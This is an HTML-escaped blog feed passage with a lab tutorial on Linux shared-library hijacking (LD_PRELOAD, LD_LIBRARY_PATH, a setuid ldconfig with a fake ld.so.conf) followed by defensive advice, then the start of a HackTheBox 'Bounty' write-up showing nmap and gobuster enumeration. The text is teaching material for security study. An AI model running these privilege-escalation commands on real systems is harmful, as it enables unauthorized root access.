&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 7376 Nov 19 20:18 /usr/bin/myexec2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ld_preload&quot;&gt;LD_PRELOAD&lt;/h4&gt;

&lt;p&gt;Using the &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; technique with the evil library on &lt;strong&gt;myexec2&lt;/strong&gt; (without setuid bit), we have the following output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/evil/libcustom.so /usr/bin/myexec2
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the same technique on &lt;strong&gt;myexec&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~/Abusing-Shared-Libraries&lt;span class=&quot;nv&quot;&gt;$ LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/evil/libcustom.so /usr/bin/myexec
Welcome to my amazing application!
Hello buddy!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that &lt;span style=&quot;color:ForestGreen&quot;&gt;it’s working when the setuid bit isn’t enabled&lt;/span&gt; for the reasons explained above.&lt;/p&gt;

&lt;h4 id=&quot;ld_library_path&quot;&gt;LD_LIBRARY_PATH&lt;/h4&gt;

&lt;p&gt;Let’s check the behavior of &lt;strong&gt;myexec&lt;/strong&gt; and &lt;strong&gt;myexec2&lt;/strong&gt; when using LD_LIBRARY_PATH:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/evil/
boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb770f000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/evil/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7708000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;# !!!&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb754c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7710000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec2
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77a1000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/evil/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb779a000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;# !!!&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb75de000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77a2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that the &lt;strong&gt;libcustom.so&lt;/strong&gt; linked with these two programs is the evil one. However, when we run them, we have the following output:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec
Welcome to my amazing application!
Hello buddy!

boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec2
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span style=&quot;color:ForestGreen&quot;&gt;Certain security measures have been put in place to avoid this kind of exploits&lt;/span&gt; but there was a time where it was possible and I think this is a pretty interesting mechanism to understand.&lt;/p&gt;

&lt;h3 id=&quot;3-setuid-bit-on-ldconfig&quot;&gt;3. Setuid bit on ldconfig&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt; is used to create, udpate and remove symbolic links for the current shared libraries based on the lib directories present in &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;.
&lt;span style=&quot;color:red&quot;&gt;This application has no setuid bit enabled by default but if an unconscious administrator sets it, he is exposing himself to some serious issues.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt; is a configuration file pointing to other configuration files that will help the linker to locate libraries.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ld.so.conf
include /etc/ld.so.conf.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside &lt;strong&gt;/etc/ld.so.conf.d/&lt;/strong&gt;, you can have several files with each of them specifying a directory to explore when searching for libraries.
For example, &lt;strong&gt;libc.conf&lt;/strong&gt; contains the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/etc/ld.so.conf.d&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;libc.conf
&lt;span class=&quot;c&quot;&gt;# libc default configuration&lt;/span&gt;
/usr/local/lib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;span style=&quot;color:red&quot;&gt;If a hazardous administrator creates a configuration file, which adds a world-writable directory (i.e. &lt;strong&gt;/tmp&lt;/strong&gt;) to the group of directories being checked by the linker, an attacker could place its malicious library here.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;It won’t be sufficient for our exploit though! We now need to use &lt;strong&gt;ldconfig&lt;/strong&gt; to update the linker’s cache so that it will be aware of this new evil library.
The cache can be updated with &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt; without specifying any parameter. However, it has to be executed as root… This is where the setuid bit comes into play. Let me show you.&lt;/p&gt;

&lt;p&gt;The configuration file from where everything starts:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ld.so.conf.d/shouldnt_be_here.conf
/tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The evil library placed inside /tmp:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /tmp/
total 12
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 boiteaklou boiteaklou 7096 Nov 20 11:01 libcustom.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; output &lt;strong&gt;BEFORE&lt;/strong&gt; executing &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7759000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /usr/lib/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb774c000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# Pointing to the original library&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7596000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb775a000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; output &lt;strong&gt;AFTER&lt;/strong&gt; executing &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldconfig
boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77c8000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77bb000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# Now pointing to /tmp/libcustom.so&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7605000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb77c9000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we execute the application…&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;…And the exploit works just fine!&lt;/p&gt;

&lt;h4 id=&quot;alternative-to-etcldsoconf&quot;&gt;Alternative to /etc/ld.so.conf&lt;/h4&gt;

&lt;p&gt;What I just showed you is working, but actually, there’s even simpler. &lt;span style=&quot;color:red&quot;&gt;The configuration file including &lt;strong&gt;/tmp&lt;/strong&gt; is not mandatory since we have the setuid bit set on &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt;&lt;/span&gt;. Indeed, &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig -f&lt;/code&gt; allows us to use a different configuration file from the existing &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;What we have to do is pretty simple, follow the example.&lt;/p&gt;

&lt;p&gt;We create our fake &lt;strong&gt;ld.so.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;include /tmp/conf/*&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; fake.ld.so.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we add a configuration file to the location indicated by &lt;strong&gt;fake.ld.so.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/tmp&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; conf/evil.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we execute &lt;code class=&quot;highlighter-rouge&quot;&gt;ldconfig&lt;/code&gt; with the -f option:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldconfig &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; fake.ld.so.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we enjoy the result:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ldd /usr/bin/myexec
	linux-gate.so.1 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7761000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libcustom.so &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /tmp/libcustom.so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7754000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	libc.so.6 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /lib/i386-linux-gnu/libc.so.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb759e000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	/lib/ld-linux.so.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xb7762000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
boiteaklou@LAB-Blog:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/myexec
Welcome to my amazing application!
I&lt;span class=&quot;s1&quot;&gt;'m the bad library
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even more straight-forward! :smile:&lt;/p&gt;

&lt;h2 id=&quot;how-can-we-defend-against-this&quot;&gt;How can we defend against this?&lt;/h2&gt;

&lt;p&gt;As a general principle, &lt;strong&gt;DO NOT set the setuid bit&lt;/strong&gt; on a program if you don’t asbolutely control every aspect of its execution, a lot of them can be used in a way that allows privilege escalations.&lt;/p&gt;

&lt;p&gt;Another fundamental aspect that shouldn’t be left behind is the &lt;strong&gt;management of user permissions&lt;/strong&gt;. As we’ve seen earlier, allowing a user to write inside /usr/lib can lead to severe security issues. If you’re a system administrator, ensure that low-privileged users can’t write to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;/usr/lib&lt;/strong&gt; and &lt;strong&gt;/lib&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Locations specified by &lt;strong&gt;/etc/ld.so.conf&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;If &lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt; is set by default on your system, the user shouldn’t be able to write at the location specified by this variable.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;More generally, ensure that every action performed by users are executed with the lowest privileges.&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Linux applications often use dynamically linked shared object libraries. These libraries allow code flexibility but they have their drawbacks… In this article, we will study the weaknesses of shared libraries and how to exploit them in many different ways. Each exploit will be illustrated by a concrete example, which should make you understand how to reproduce it. I’ll give recommendations on how to protect your system against it in the final part of the article.</summary></entry><entry><title type="html">HackTheBox: Bounty writeup - Metasploit basics</title><link href="http://localhost:4000/HackTheBox-Bounty.html" rel="alternate" type="text/html" title="HackTheBox: Bounty writeup - Metasploit basics" /><published>2018-10-28T22:00:00+01:00</published><updated>2018-10-28T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Bounty</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Bounty.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/bounty-box.png&quot; alt=&quot;Bounty box&quot; title=&quot;Bounty Box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This machine was pretty easy so I’m going to take this opportunity to explain you &lt;strong&gt;the basics of the Metasploit framework&lt;/strong&gt;.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#metasploit-introduction&quot; id=&quot;markdown-toc-metasploit-introduction&quot;&gt;Metasploit Introduction&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#initial-foothold&quot; id=&quot;markdown-toc-initial-foothold&quot;&gt;Initial Foothold&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-application-mapping&quot; id=&quot;markdown-toc-web-application-mapping&quot;&gt;Web Application mapping&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#user-access&quot; id=&quot;markdown-toc-user-access&quot;&gt;User Access&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#meterpreter-shell&quot; id=&quot;markdown-toc-meterpreter-shell&quot;&gt;Meterpreter Shell&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#meterpreter-shell-payload&quot; id=&quot;markdown-toc-meterpreter-shell-payload&quot;&gt;Meterpreter Shell Payload&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#payload-incorporation&quot; id=&quot;markdown-toc-payload-incorporation&quot;&gt;Payload Incorporation&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#upload-webconfig-and-access-it&quot; id=&quot;markdown-toc-upload-webconfig-and-access-it&quot;&gt;Upload web.config and access it&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#back-to-msfconsole&quot; id=&quot;markdown-toc-back-to-msfconsole&quot;&gt;Back to msfconsole&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#gimme-this-usertxt&quot; id=&quot;markdown-toc-gimme-this-usertxt&quot;&gt;Gimme this user.txt&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#local-exploit-suggester&quot; id=&quot;markdown-toc-local-exploit-suggester&quot;&gt;Local Exploit Suggester&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ms10_092_schelevator&quot; id=&quot;markdown-toc-ms10_092_schelevator&quot;&gt;ms10_092_schelevator&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#final-words&quot; id=&quot;markdown-toc-final-words&quot;&gt;Final Words&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;metasploit-introduction&quot;&gt;Metasploit Introduction&lt;/h2&gt;

&lt;p&gt;Metasploit is an open-source pentesting framework distributed by &lt;strong&gt;Rapid7&lt;/strong&gt;. It is extremly powerful and easy to use once you understand the logic.&lt;/p&gt;

&lt;p&gt;You can use it for generating a bunch of payloads for every system or languages with &lt;strong&gt;msfvenom&lt;/strong&gt;. It can also be run as an interactive console for connecting to the target system and exploiting it without leaving the console.&lt;/p&gt;

&lt;p&gt;Metasploit relies on &lt;strong&gt;modules&lt;/strong&gt;, which are specifically designed to exploit vulnerabilities. Each module has &lt;strong&gt;a list of options&lt;/strong&gt; that you have to set in order to adapt the exploit to your specific environment. Then, you type “exploit” and &lt;strong&gt;Metasploit does the job for you&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;This tool is &lt;strong&gt;extremely powerful&lt;/strong&gt; when you want to exploit something quickly but it is &lt;strong&gt;not the best approach&lt;/strong&gt; in a learning process because everything is done hunder the hood and you don’t really know what happens on the system. To be used with caution… :wink:&lt;/p&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;Back to our Bounty machine, we will perform the usual steps of &lt;strong&gt;information gathering&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;/h3&gt;

&lt;p&gt;First, run a &lt;strong&gt;nmap&lt;/strong&gt; scan with default scripts and version detection enabled. We will run a deeper scan if nothing is found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.70 scan initiated Sun Oct 21 13:58:33 2018 as: nmap -sC -sV -oA nmap/bounty 10.10.10.93&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.93
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.039s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Oct 21 13:58:45 2018 -- 1 IP address (1 host up) scanned in 12.07 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A single open port doesn’t seem like much so we will run a deeper scan in background while we start investigating this website.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We can notice that the webserver runs on IIS 7.5, which is completely outdated since the last version is 10.0.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;web-application-mapping&quot;&gt;Web Application mapping&lt;/h3&gt;

&lt;p&gt;A good practice for saving time is to start running a directory listing tool such as &lt;strong&gt;dirbuster&lt;/strong&gt; or &lt;strong&gt;gobuster&lt;/strong&gt; before playing with the website’s features manually. I prefer using &lt;strong&gt;gobuster&lt;/strong&gt; since it’s a bit faster.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty/dirb&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.93/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster/bounty
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The scan will take a few minutes so we will check the results later.&lt;/p&gt;

&lt;p&gt;Let’s see what this website looks like…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-28/website.png&quot; alt=&quot;Bounty website&quot; title=&quot;Bounty website&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A wonderful merlin drawing! It might be an hint.&lt;/p&gt;

&lt;p&gt;The source code doesn’t reveal anything more… Hopefully gobuster will fly to our rescue!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/Bounty&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;gobuster/bounty
/UploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/uploadedFiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/uploadedfiles &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

